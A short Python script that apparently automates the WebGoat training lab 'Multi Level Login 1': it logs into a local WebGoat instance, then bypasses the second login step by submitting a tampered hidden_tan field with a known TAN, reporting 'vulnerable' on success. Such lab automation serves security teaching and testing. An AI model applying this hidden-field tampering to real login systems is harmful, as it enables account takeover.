# multi_auth1.py
import requests
import json
import pprint
import re
import sys

DEBUG = False
if len(sys.argv) > 1 and sys.argv[1] == "-d":
        DEBUG = True
pp = pprint.PrettyPrinter(indent=4)
http_proxy = "127.0.0.1:8888"
https_proxy = "127.0.0.1:8888"
proxyDict = {"http" : http_proxy, "https" : https_proxy}

base_url = 'http://localhost:8080/WebGoat/'
s = requests.Session()
if DEBUG:
    s.proxies = proxyDict
s.get(base_url + 'login.mvc')
s.post(base_url + 'j_spring_security_check', data = {"username": "guest", "password": "guest"})
list_res = s.get(base_url + 'service/lessonmenu.mvc')
side_list = list_res.json()
auth_items = filter(lambda x: x['name'] == 'Authentication Flaws', side_list)
challenge_obj = filter(lambda y: y['name'] == 'Multi Level Login 1', auth_items[0]['children'])
attack_url = challenge_obj[0]['link']
attack_page_res = s.get(base_url + attack_url)
attack_page = attack_page_res.text
#print attack_page
first_submit = s.post(base_url + attack_url, data = {"user": "Jane", "pass": "tarzan", "Submit": "Submit" })
final = s.post(base_url + attack_url, data = {"hidden_tan": "1", "tan": "15648", "Submit": "Submit" })
success = re.search("Congratulations", final.text)
if success:
    print 'vulnerable'
    exit(1)
else:
    exit(0)

